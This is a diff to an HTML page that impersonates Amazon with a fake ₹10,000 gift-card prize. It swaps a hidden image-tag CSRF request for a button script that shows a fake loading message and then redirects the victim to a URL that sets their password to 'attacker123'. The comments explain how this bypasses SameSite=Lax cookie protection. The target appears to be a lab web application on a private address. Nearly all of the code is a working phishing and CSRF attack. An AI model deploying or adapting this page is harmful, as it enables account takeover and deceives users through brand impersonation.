@@ -17,8 +17,6 @@
            padding: 15px 40px; border: none; 
            font-size: 18px; border-radius: 5px; 
            cursor: pointer; }
-    .btn:hover { background: #e47911; }
-    .small { font-size: 11px; color: #999; margin-top: 20px; }
   </style>
 </head>
 <body>
@@ -29,32 +27,35 @@
 
 <div class="container">
   <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" 
-       width="150" /><br><br>
-  
+       width="150" />
   <div class="prize-box">
     🎉 Congratulations! You won ₹10,000 Amazon Gift Card!
   </div>
-  
   <p>Dear Valued Customer,</p>
   <p>Your account has been selected for our annual lucky draw!</p>
   <p>Click below to claim your reward immediately.</p>
-  
-  <button class="btn" onclick="claim()">Claim Your Prize Now!</button>
-  
-  <p class="small">
-    Offer valid for 24 hours only. Terms and conditions apply.
-  </p>
+
+  <!-- Button triggers CSRF via top-level navigation -->
+  <!-- SameSite=Lax allows cookies on top level GET! -->
+  <button class="btn" onclick="attack()">
+    Claim Your Prize Now!
+  </button>
+
+  <p><small>Offer valid for 24 hours only.</small></p>
 </div>
 
-<!-- Hidden CSRF attack fires silently on page load -->
-<img src="http://192.168.133.100/csrf_1.php?password_new=attacker123&password_conf=attacker123&action=change" 
-     width="0" height="0" style="display:none" />
-
 <script>
-function claim() {
-  // Shows fake loading to distract victim
-  alert("Processing your reward... Please wait!");
-  // Meanwhile CSRF already fired silently above
+function attack() {
+  // Step 1: Show fake loading to distract victim
+  document.querySelector('.prize-box').innerHTML = 
+    '⏳ Processing your reward... Please wait!';
+  
+  // Step 2: Redirect victim browser to CSRF URL
+  // This is TOP LEVEL navigation = SameSite=Lax allows cookies!
+  setTimeout(function() {
+    window.location.href = 
+      'http://192.168.133.100/csrf_1.php?password_new=attacker123&password_conf=attacker123&action=change';
+  }, 2000);
 }
 </script>
 
